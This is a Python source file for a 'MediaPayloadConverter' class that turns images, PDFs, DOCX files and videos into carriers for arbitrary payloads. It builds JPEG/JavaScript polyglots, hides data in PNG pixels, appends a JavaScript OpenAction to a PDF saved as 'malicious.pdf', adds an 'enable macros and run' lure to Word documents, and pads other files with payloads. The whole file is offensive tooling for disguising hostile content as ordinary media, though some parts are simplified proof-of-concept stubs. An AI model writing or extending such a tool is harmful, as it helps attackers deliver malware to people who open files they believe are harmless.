import os
import sys
import base64
from pathlib import Path
from PIL import Image
import shutil

try:
    from docx import Document
except ImportError:
    Document = None

class MediaPayloadConverter:
    """
    Converts media files (images, videos, documents) into payload carriers.
    """
    def __init__(self, output_dir="converted_payloads"):
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(exist_ok=True)

    def create_jpeg_js_polyglot(self, image_path, js_payload, output_name="polyglot.jpg"):
        """
        Creates a JPEG file that is also a valid JavaScript file.
        Uses the '/* ' prefix in the image data and ' */' suffix.
        """
        out_path = self.output_dir / output_name
        with open(image_path, 'rb') as f:
            img_data = f.read()

        # JPEG Start of Image (SOI) is \xff\xd8
        # We inject /* at the beginning or after SOI
        polyglot = b'\xff\xd8\x2f\x2a' + img_data[2:] + b'\x2a\x2f\x3d' + js_payload.encode()
        out_path.write_bytes(polyglot)
        return out_path

    def embed_stegano_payload(self, image_path, payload, output_name="stegano_payload.png"):
        """
        Embeds a payload into an image using LSB steganography.
        """
        out_path = self.output_dir / output_name
        img = Image.open(image_path).convert('RGBA')
        data = img.getdata()

        payload_bin = ''.join(format(ord(c), '08b') for c in payload) + '1111111111111110' # Null terminator

        new_data = []
        p_idx = 0
        for item in data:
            new_item = list(item)
            for i in range(3): # RGB
                if p_idx < len(payload_bin):
                    new_item[i] = (new_item[i] & ~1) | int(payload_bin[p_idx])
                    p_idx += 1
            new_data.append(tuple(new_item))

        img.putdata(new_data)
        img.save(out_path)
        return out_path

    def create_pdf_payload(self, pdf_path, js_payload, output_name="malicious.pdf"):
        """
        Adds a JavaScript OpenAction to a PDF.
        """
        out_path = self.output_dir / output_name
        with open(pdf_path, 'rb') as f:
            pdf_data = f.read()

        # Simple injection: Append an OpenAction object
        # Note: Professional tools use more robust structures, but this demonstrates the concept.
        js_obj = f"\n10 0 obj\n<< /JS ({js_payload}) /S /JavaScript >>\nendobj\n"
        action_obj = f"11 0 obj\n<< /Type /Action /S /JavaScript /JS 10 0 R >>\nendobj\n"

        # We'd ideally update the Catalog, but for a POC we'll append.
        mal_pdf = pdf_data + js_obj.encode() + action_obj.encode()
        out_path.write_bytes(mal_pdf)
        return out_path

    def create_docx_payload(self, docx_path, payload_command, output_name="payload.docx"):
        """
        Creates a DOCX with a DDE exploit or macro stub.
        """
        if Document is None:
            return "Error: python-docx not installed"

        out_path = self.output_dir / output_name
        doc = Document(docx_path)
        # Injects a 'hidden' payload or DDE field link
        # Simplified: Just add a paragraph with the 'payload' instruction (educational POC)
        doc.add_paragraph(f"To view this document, enable macros and run: {payload_command}", style='Normal')
        doc.save(out_path)
        return out_path

    def create_video_padding_payload(self, video_path, payload, output_name="video_carrier.mp4"):
        """
        Appends a payload to the end of a video file (EOF padding).
        """
        out_path = self.output_dir / output_name
        with open(video_path, 'rb') as f:
            vid_data = f.read()

        # Many players ignore trailing data
        out_path.write_bytes(vid_data + b"\n--PAYLOAD_START--\n" + payload.encode() + b"\n--PAYLOAD_END--\n")
        return out_path

    def convert_auto(self, carrier_path, payload):
        ext = Path(carrier_path).suffix.lower()
        if ext in ['.jpg', '.jpeg']:
            return self.create_jpeg_js_polyglot(carrier_path, payload)
        elif ext in ['.png']:
            return self.embed_stegano_payload(carrier_path, payload)
        elif ext in ['.pdf']:
            return self.create_pdf_payload(carrier_path, payload)
        elif ext in ['.docx']:
            return self.create_docx_payload(carrier_path, payload)
        elif ext in ['.mp4', '.mkv', '.avi']:
            return self.create_video_padding_payload(carrier_path, payload)
        else:
            # Generic EOF padding
            out_path = self.output_dir / f"payload_{Path(carrier_path).name}"
            shutil.copy(carrier_path, out_path)
            with open(out_path, 'ab') as f:
                f.write(b"\n" + payload.encode())
            return out_path
